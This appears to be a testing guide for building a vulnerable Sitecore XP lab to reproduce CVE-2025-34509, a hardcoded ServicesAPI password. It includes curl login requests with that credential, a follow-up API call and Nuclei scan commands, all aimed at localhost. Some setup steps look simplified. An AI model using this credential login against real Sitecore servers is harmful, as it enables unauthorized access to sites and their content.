# CVE-2025-34509 Vulnerable Instance Setup Guide

## Overview

This guide provides step-by-step instructions to set up a vulnerable Sitecore Experience Platform instance for testing CVE-2025-34509 (hardcoded ServicesAPI credentials).

## Prerequisites

- Windows Server 2016/2019/2022 or Windows 10/11
- Minimum 8GB RAM (16GB recommended)
- 50GB+ free disk space
- Administrator privileges
- Internet connection for downloads

## Vulnerable Versions

The following Sitecore versions contain the hardcoded ServicesAPI account with password 'b':

- **Sitecore XP 10.1** to 10.1.4 rev. 011974 PRE
- **Sitecore XP 10.2** (all versions)
- **Sitecore XP 10.3** to 10.3.3 rev. 011967 PRE
- **Sitecore XP 10.4** to 10.4.1 rev. 011941 PRE

## Setup Instructions

### Step 1: Download Sitecore XP

1. Visit [Sitecore Developer Portal](https://dev.sitecore.net/)
2. Create a free account if you don't have one
3. Download Sitecore XP 10.1, 10.2, 10.3, or 10.4 (any version in the vulnerable range)
4. Download the corresponding Sitecore Installation Framework (SIF) module

### Step 2: Install Prerequisites

1. **Install IIS** with the following features:
   - Web Server (IIS)
   - Application Development
   - .NET Extensibility 4.8
   - ASP.NET 4.8
   - ISAPI Extensions
   - ISAPI Filters

2. **Install SQL Server** (2016/2017/2019/2022):
   - SQL Server Database Engine
   - SQL Server Management Studio
   - Enable Mixed Mode Authentication

3. **Install .NET Framework 4.8** (if not already installed)

4. **Install Microsoft Visual C++ Redistributable** (latest version)

### Step 3: Configure Sitecore Instance

1. **Extract Sitecore XP** to `C:\inetpub\wwwroot\sitecore`

2. **Create Sitecore Database**:
   ```sql
   -- Connect to SQL Server and run:
   CREATE DATABASE [Sitecore.Core]
   CREATE DATABASE [Sitecore.Master]
   CREATE DATABASE [Sitecore.Web]
   ```

3. **Configure Connection Strings** in `web.config`:
   ```xml
   <connectionStrings>
     <add name="core" connectionString="Server=localhost;Database=Sitecore.Core;Integrated Security=true;" />
     <add name="master" connectionString="Server=localhost;Database=Sitecore.Master;Integrated Security=true;" />
     <add name="web" connectionString="Server=localhost;Database=Sitecore.Web;Integrated Security=true;" />
   </connectionStrings>
   ```

4. **Configure IIS**:
   - Create new Application Pool: `SitecorePool` (.NET Framework 4.8, Integrated mode)
   - Create new Website pointing to `C:\inetpub\wwwroot\sitecore`
   - Set Application Pool to `SitecorePool`

### Step 4: Verify ServicesAPI Account

The hardcoded ServicesAPI account should be automatically created during Sitecore installation. To verify:

1. **Check Sitecore User Manager**:
   - Navigate to `/sitecore/admin/users.aspx`
   - Look for user: `sitecore\ServicesAPI`
   - Password should be: `b`

2. **Verify via Database** (if needed):
   ```sql
   USE [Sitecore.Core]
   SELECT * FROM [aspnet_Users] WHERE UserName = 'ServicesAPI'
   ```

### Step 5: Test the Vulnerability

1. **Start Sitecore Instance**:
   - Ensure IIS is running
   - Navigate to `http://localhost/sitecore`

2. **Test Authentication**:
   ```bash
   curl -X POST http://localhost/sitecore/api/ssc/auth/login \
     -H "Content-Type: application/json" \
     -H "X-Requested-With: XMLHttpRequest" \
     -d '{"domain":"sitecore","username":"ServicesAPI","password":"b"}'
   ```

3. **Expected Response**:
   ```json
   {
     "success": true,
     "token": "...",
     "user": {
       "userName": "ServicesAPI",
       "domain": "sitecore"
     }
   }
   ```

## Docker Setup (Alternative)

For easier setup, you can use Docker:

### Dockerfile
```dockerfile
FROM mcr.microsoft.com/dotnet/framework/aspnet:4.8-windowsservercore-ltsc2019

# Install IIS features
RUN dism /online /enable-feature /featurename:IIS-WebServerRole /all
RUN dism /online /enable-feature /featurename:IIS-WebServer /all
RUN dism /online /enable-feature /featurename:IIS-CommonHttpFeatures /all
RUN dism /online /enable-feature /featurename:IIS-HttpErrors /all
RUN dism /online /enable-feature /featurename:IIS-HttpLogging /all
RUN dism /online /enable-feature /featurename:IIS-RequestFiltering /all
RUN dism /online /enable-feature /featurename:IIS-StaticContent /all
RUN dism /online /enable-feature /featurename:IIS-DefaultDocument /all
RUN dism /online /enable-feature /featurename:IIS-DirectoryBrowsing /all
RUN dism /online /enable-feature /featurename:IIS-ASPNET45 /all

# Copy Sitecore files
COPY sitecore/ C:/inetpub/wwwroot/sitecore/

# Expose port
EXPOSE 80

# Start IIS
CMD ["C:\\ServiceMonitor.exe", "w3svc"]
```

### Docker Compose
```yaml
version: '3.8'
services:
  sitecore:
    build: .
    ports:
      - "80:80"
    environment:
      - ASPNETCORE_ENVIRONMENT=Development
    volumes:
      - ./sitecore:/inetpub/wwwroot/sitecore
```

## Testing with Nuclei Template

Once the vulnerable instance is running:

```bash
# Basic test
nuclei -t http/cves/2025/CVE-2025-34509.yaml -u http://localhost/sitecore

# Debug test
nuclei -t http/cves/2025/CVE-2025-34509.yaml -debug -u http://localhost/sitecore

# Verbose output
nuclei -t http/cves/2025/CVE-2025-34509.yaml -v -u http://localhost/sitecore
```

## Expected Results

### Successful Detection
```
[CVE-2025-34509] [http] [high] [http] http://localhost/sitecore/sitecore/api/ssc/auth/login
[CVE-2025-34509] [http] [high] [http] http://localhost/sitecore/sitecore/api/sitecore/ItemService/GetChildren
[CVE-2025-34509] [http] [high] [http] http://localhost/sitecore/sitecore/api/sitecore/ItemService/GetItem
```

### Debug Output
```
[INF] [CVE-2025-34509] Dumped HTTP request for http://localhost/sitecore/sitecore/api/ssc/auth/login
[INF] [CVE-2025-34509] Dumped HTTP response for http://localhost/sitecore/sitecore/api/ssc/auth/login
[INF] [CVE-2025-34509] Dumped HTTP request for http://localhost/sitecore/sitecore/api/sitecore/ItemService/GetChildren
[INF] [CVE-2025-34509] Dumped HTTP response for http://localhost/sitecore/sitecore/api/sitecore/ItemService/GetChildren
```

## Troubleshooting

### Common Issues

1. **ServicesAPI account not found**:
   - Ensure you're using a vulnerable version
   - Check Sitecore installation logs
   - Verify database connection

2. **Authentication fails**:
   - Check if ServicesAPI account is enabled
   - Verify password is 'b' (lowercase)
   - Ensure domain is 'sitecore'

3. **API endpoints not accessible**:
   - Verify Sitecore is fully installed
   - Check IIS configuration
   - Ensure proper permissions

### Verification Commands

```bash
# Check if Sitecore is running
curl -I http://localhost/sitecore

# Test login endpoint
curl -X POST http://localhost/sitecore/api/ssc/auth/login \
  -H "Content-Type: application/json" \
  -d '{"domain":"sitecore","username":"ServicesAPI","password":"b"}'

# Test API access (after successful login)
curl -H "Cookie: ASP.NET_SessionId=YOUR_SESSION_ID" \
  http://localhost/sitecore/api/sitecore/ItemService/GetChildren?sc_itemid={110D559F-DEA5-42EA-9C1C-8A5DF7E70EF9}
```

## Security Notice

 **WARNING**: This setup creates a vulnerable instance for testing purposes only. Do not expose this instance to the internet or use it in production environments.

## References

- [Sitecore Installation Guide](https://doc.sitecore.com/xp/en/developers/101/developer-tools/installation-wizard.html)
- [Sitecore Developer Portal](https://dev.sitecore.net/)
- [CVE-2025-34509 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-34509)
